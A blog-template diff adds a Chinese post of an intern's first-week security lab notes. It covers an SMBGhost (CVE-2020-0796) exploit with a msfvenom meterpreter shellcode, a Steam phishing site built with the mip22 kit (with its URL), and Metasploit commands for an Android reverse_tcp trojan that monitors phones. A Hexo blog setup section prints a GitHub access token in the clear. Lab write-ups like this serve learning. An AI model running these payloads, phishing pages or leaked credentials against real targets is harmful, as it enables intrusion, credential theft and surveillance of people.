@@ -48,6 +48,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-我的" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/01/%E6%88%91%E7%9A%84/">实习第一星期学习内容汇总</a>
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2023/12/01/%E6%88%91%E7%9A%84/" class="article-date">
+  <time datetime="2023-12-01T06:37:14.000Z" itemprop="datePublished">2023-12-01</time>
+</a>
+          
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%80/" rel="tag">一</a></li></ul>
+
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="一-永恒之黑漏洞蓝屏攻击"><a href="#一-永恒之黑漏洞蓝屏攻击" class="headerlink" title="一.永恒之黑漏洞蓝屏攻击"></a>一.永恒之黑漏洞蓝屏攻击</h1><h2 id="1-在靶机（ip192-168-186-128）里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip-关闭靶机防火墙并运行工具，检查漏洞风险"><a href="#1-在靶机（ip192-168-186-128）里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip-关闭靶机防火墙并运行工具，检查漏洞风险" class="headerlink" title="1.在靶机（ip192.168.186.128）里下载检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/关闭靶机防火墙并运行工具，检查漏洞风险"></a>1.在靶机（ip192.168.186.128）里下载检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/%E5%85%B3%E9%97%AD%E9%9D%B6%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99%E5%B9%B6%E8%BF%90%E8%A1%8C%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E%E9%A3%8E%E9%99%A9">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/关闭靶机防火墙并运行工具，检查漏洞风险</a></h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201163019434.png" alt="image-20231201163019434"></p>
+<h2 id="2-在kali中利用MSF生成木马："><a href="#2-在kali中利用MSF生成木马：" class="headerlink" title="2.在kali中利用MSF生成木马："></a>2.在kali中利用MSF生成木马：</h2><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;kali的IP地址 LPORT&#x3D;5555 -b ‘\x00’ -i 1 -f ，用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201163229551.png" alt="image-20231201163229551"></p>
+<h2 id="3-将POC放入kali里，运行指令CVE-2020-0796-py-192-168-186-128-攻击靶机"><a href="#3-将POC放入kali里，运行指令CVE-2020-0796-py-192-168-186-128-攻击靶机" class="headerlink" title="3.将POC放入kali里，运行指令CVE-2020-0796.py 192.168.186.128,攻击靶机"></a>3.将POC放入kali里，运行指令CVE-2020-0796.py 192.168.186.128,攻击靶机</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201170837148.png" alt="image-20231201170837148"></p>
+<h2 id="4-攻击成功"><a href="#4-攻击成功" class="headerlink" title="4.攻击成功"></a>4.攻击成功</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201170942859.png" alt="image-20231201170942859"></p>
+<h1 id="二-Steam钓鱼"><a href="#二-Steam钓鱼" class="headerlink" title="二.Steam钓鱼"></a>二.Steam钓鱼</h1><h2 id="1-使用vim-etc-proxychains4-conf指令编辑代理设置：将sock4指向物理机ip"><a href="#1-使用vim-etc-proxychains4-conf指令编辑代理设置：将sock4指向物理机ip" class="headerlink" title="1.使用vim &#x2F;etc&#x2F;proxychains4.conf指令编辑代理设置：将sock4指向物理机ip"></a>1.使用vim &#x2F;etc&#x2F;proxychains4.conf指令编辑代理设置：将sock4指向物理机ip</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201171303111.png" alt="image-20231201171303111"></p>
+<h2 id="2-使用-指令proxychains4-git-clone-https-github-com-makdosx-mip22下载模板"><a href="#2-使用-指令proxychains4-git-clone-https-github-com-makdosx-mip22下载模板" class="headerlink" title="2.使用 指令proxychains4 git clone https://github.com/makdosx/mip22下载模板"></a>2.使用 指令proxychains4 git clone <a target="_blank" rel="noopener" href="https://github.com/makdosx/mip22%E4%B8%8B%E8%BD%BD%E6%A8%A1%E6%9D%BF">https://github.com/makdosx/mip22下载模板</a></h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201171448319.png" alt="image-20231201171448319"></p>
+<h2 id="3-选择指令生成钓鱼网站"><a href="#3-选择指令生成钓鱼网站" class="headerlink" title="3.选择指令生成钓鱼网站"></a>3.选择指令生成钓鱼网站</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201171525810.png" alt="image-20231201171525810"></p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201171537482.png" alt="image-20231201171537482"></p>
+<p>生成钓鱼网站：<a target="_blank" rel="noopener" href="http://supplements-transaction-lip-malpractice.trycloudflare.com/index.html">http://supplements-transaction-lip-malpractice.trycloudflare.com/index.html</a></p>
+<h1 id="三-建立自己的博客并更换主题和编辑博客"><a href="#三-建立自己的博客并更换主题和编辑博客" class="headerlink" title="三.建立自己的博客并更换主题和编辑博客"></a>三.建立自己的博客并更换主题和编辑博客</h1><h2 id="1-安装git，node软件，并建立blog文件"><a href="#1-安装git，node软件，并建立blog文件" class="headerlink" title="1.安装git，node软件，并建立blog文件"></a>1.安装git，node软件，并建立blog文件</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201173706616.png" alt="image-20231201173706616"></p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201173720319.png" alt="image-20231201173720319"></p>
+<h2 id="2-配置ssh"><a href="#2-配置ssh" class="headerlink" title="2.配置ssh"></a>2.配置ssh</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201173753568.png" alt="image-20231201173753568"></p>
+<h2 id="3-检测网站雏形"><a href="#3-检测网站雏形" class="headerlink" title="3.检测网站雏形"></a>3.检测网站雏形</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201173836318.png" alt="image-20231201173836318"></p>
+<h2 id="4-建立一个新储存库，保证你的用户名跟库的名字相同"><a href="#4-建立一个新储存库，保证你的用户名跟库的名字相同" class="headerlink" title="4.建立一个新储存库，保证你的用户名跟库的名字相同"></a>4.建立一个新储存库，保证你的用户名跟库的名字相同</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201173907014.png" alt="image-20231201173907014"></p>
+<h2 id="5-换boke主题-，执行git-clone-https-github-com-Shen-Yu-hexo-theme-ayer-git-themes-ayer安装主题文件，将config-yml文件里的theme：改为主题名"><a href="#5-换boke主题-，执行git-clone-https-github-com-Shen-Yu-hexo-theme-ayer-git-themes-ayer安装主题文件，将config-yml文件里的theme：改为主题名" class="headerlink" title="5.换boke主题 ，执行git clone https://github.com/Shen-Yu/hexo-theme-ayer.git themes&#x2F;ayer安装主题文件，将config.yml文件里的theme：改为主题名"></a>5.换boke主题 ，执行git clone <a target="_blank" rel="noopener" href="https://github.com/Shen-Yu/hexo-theme-ayer.git">https://github.com/Shen-Yu/hexo-theme-ayer.git</a> themes&#x2F;ayer安装主题文件，将config.yml文件里的theme：改为主题名</h2><p>在命令行运行hexo clean，hexo d -g，完成主题变换</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174142265.png" alt="image-20231201174142265"></p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174159184.png" alt="image-20231201174159184"></p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174223149.png" alt="image-20231201174223149"></p>
+<p>更换博客主题成功</p>
+<h2 id="6-安装picgo，typora两个软件，github建立一个新仓库，获得图床访问令牌ghp-BzW34s2MD7vNSVIFfF73bugkDygFls3AhwiI，完成软件的配置"><a href="#6-安装picgo，typora两个软件，github建立一个新仓库，获得图床访问令牌ghp-BzW34s2MD7vNSVIFfF73bugkDygFls3AhwiI，完成软件的配置" class="headerlink" title="6.安装picgo，typora两个软件，github建立一个新仓库，获得图床访问令牌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，完成软件的配置"></a>6.安装picgo，typora两个软件，github建立一个新仓库，获得图床访问令牌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，完成软件的配置</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174428592.png" alt="image-20231201174428592"></p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174439590.png" alt="image-20231201174439590"></p>
+<h2 id="7-博客编辑内容执行hexo-n-“我的”-hexo-clean-hexo-d-g等指令，生成我的文章名为“我的”，利用typora编辑并上传到博客"><a href="#7-博客编辑内容执行hexo-n-“我的”-hexo-clean-hexo-d-g等指令，生成我的文章名为“我的”，利用typora编辑并上传到博客" class="headerlink" title="7.博客编辑内容执行hexo n “我的”,hexo clean,hexo d -g等指令，生成我的文章名为“我的”，利用typora编辑并上传到博客"></a>7.博客编辑内容执行hexo n “我的”,hexo clean,hexo d -g等指令，生成我的文章名为“我的”，利用typora编辑并上传到博客</h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174640148.png" alt="image-20231201174640148"></p>
+<p>效果展示，博客编辑成功</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201174714855.png" alt="image-20231201174714855"></p>
+<h1 id="四-利用kali生成安卓木马软件，监控手机"><a href="#四-利用kali生成安卓木马软件，监控手机" class="headerlink" title="四.利用kali生成安卓木马软件，监控手机"></a>四.利用kali生成安卓木马软件，监控手机</h1><h2 id="1-依次执行这些命令"><a href="#1-依次执行这些命令" class="headerlink" title="1.依次执行这些命令"></a>1.依次执行这些命令</h2><p>use exploit&#x2F;multi&#x2F;handler   &#x2F;&#x2F;加载模块</p>
+<p>set payload android&#x2F;meterpreter&#x2F;reverse_tcp   &#x2F;&#x2F;选择Payload</p>
+<p>show options   &#x2F;&#x2F;查看参数设置<br>set LHOST kali IP  &#x2F;&#x2F;这里的地址设置成我们刚才生成木马的IP地址<br>set LPORT 5555   &#x2F;&#x2F;这里的端口设置成刚才我们生成木马所监听的端口<br>exploit   &#x2F;&#x2F;开始执行漏洞 开始监听,等待手机上线</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201175132071.png" alt="image-20231201175132071"></p>
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
     <article id="post-x" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
